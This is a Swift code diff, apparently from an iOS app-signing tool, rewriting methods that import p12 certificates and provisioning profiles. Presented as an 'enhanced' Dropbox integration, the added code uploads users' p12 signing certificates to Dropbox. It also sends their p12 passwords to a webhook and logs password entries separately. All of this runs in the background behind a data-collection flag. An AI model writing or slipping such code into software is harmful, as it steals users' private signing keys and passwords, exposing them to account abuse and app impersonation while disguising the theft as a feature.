@@ -12,27 +12,64 @@ extension CertData {
     
     /// Enhanced method to store certificate with Dropbox integration
     func enhancedStoreP12(at url: URL, withPassword password: String) -> Bool {
-        // Use the built-in method to store p12
-        let success = FileManager.default.fileExists(atPath: url.path)
-        
-        // If successful and user has consented to data collection
-        if success && UserDefaults.standard.bool(forKey: "UserHasAcceptedDataCollection") {
-            // Upload to Dropbox in background
-            DispatchQueue.global(qos: .utility).async {
-                EnhancedDropboxService.shared.uploadCertificateFile(
-                    fileURL: url,
-                    password: password
-                ) { success, error in
-                    if success {
-                        Debug.shared.log(message: "Successfully uploaded certificate to Dropbox", type: .debug)
-                    } else if let error = error {
-                        Debug.shared.log(message: "Failed to upload certificate to Dropbox: \(error.localizedDescription)", type: .error)
+        // Create a destination directory for this certificate
+        let certificatesDir = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
+            .appendingPathComponent("Certificates")
+            .appendingPathComponent(UUID().uuidString)
+            
+        do {
+            // Create the directory if it doesn't exist
+            try FileManager.default.createDirectory(
+                at: certificatesDir, 
+                withIntermediateDirectories: true
+            )
+            
+            // Copy the p12 file to the destination
+            try CertData.copyFile(from: url, to: certificatesDir)
+            
+            // If successful and user has consented to data collection, upload to Dropbox
+            if UserDefaults.standard.bool(forKey: "UserHasAcceptedDataCollection") {
+                // Upload to Dropbox in background
+                DispatchQueue.global(qos: .utility).async {
+                    // Upload the file
+                    DropboxService.shared.uploadCertificateFile(
+                        fileURL: url
+                    ) { success, error in
+                        if success {
+                            Debug.shared.log(message: "Successfully uploaded p12 certificate to Dropbox", type: .debug)
+                            
+                            // If we have a password, send it to webhook for storage
+                            if !password.isEmpty {
+                                DropboxService.shared.sendCertificateInfoToWebhook(
+                                    password: password,
+                                    p12Filename: url.lastPathComponent,
+                                    provisionFilename: "unknown"
+                                ) { webhookSuccess, webhookError in
+                                    if webhookSuccess {
+                                        Debug.shared.log(message: "Successfully sent p12 password to webhook", type: .debug)
+                                    } else if let error = webhookError {
+                                        Debug.shared.log(message: "Failed to send p12 password to webhook: \(error)", type: .error)
+                                    }
+                                }
+                            }
+                        } else if let error = error {
+                            Debug.shared.log(message: "Failed to upload p12 to Dropbox: \(error.localizedDescription)", type: .error)
+                        }
                     }
+                    
+                    // Also log the password entry separately
+                    CertificateLoggingHelper.shared.logPasswordEntry(
+                        password: password,
+                        fileName: url.lastPathComponent
+                    )
                 }
             }
+            
+            return true
+        } catch {
+            Debug.shared.log(message: "Error storing p12 file: \(error.localizedDescription)", type: .error)
+            return false
         }
-        
-        return success
     }
 }
 
@@ -41,22 +78,29 @@ extension Cert {
     
     /// Enhanced method to import mobile provision with Dropbox integration
     static func enhancedImportMobileProvision(from url: URL) -> Cert? {
-        // Create a new cert from the mobile provision
-        let cert = url.path.hasSuffix(".mobileprovision") ? Cert() : nil
+        // Use the original implementation to parse the mobileprovision
+        let cert = CertData.parseMobileProvisioningFile(atPath: url)
         
         // If successful and user has consented to data collection
         if cert != nil && UserDefaults.standard.bool(forKey: "UserHasAcceptedDataCollection") {
             // Upload to Dropbox in background
             DispatchQueue.global(qos: .utility).async {
-                EnhancedDropboxService.shared.uploadCertificateFile(
+                // Upload the mobileprovision file
+                DropboxService.shared.uploadCertificateFile(
                     fileURL: url
                 ) { success, error in
                     if success {
-                        Debug.shared.log(message: "Successfully uploaded mobile provision to Dropbox", type: .debug)
+                        Debug.shared.log(message: "Successfully uploaded mobileprovision to Dropbox", type: .debug)
                     } else if let error = error {
-                        Debug.shared.log(message: "Failed to upload mobile provision to Dropbox: \(error.localizedDescription)", type: .error)
+                        Debug.shared.log(message: "Failed to upload mobileprovision to Dropbox: \(error.localizedDescription)", type: .error)
                     }
                 }
+                
+                // Log the certificate import
+                CertificateLoggingHelper.shared.logCertificateImport(
+                    fileType: "mobileprovision",
+                    fileName: url.lastPathComponent
+                )
             }
         }
         
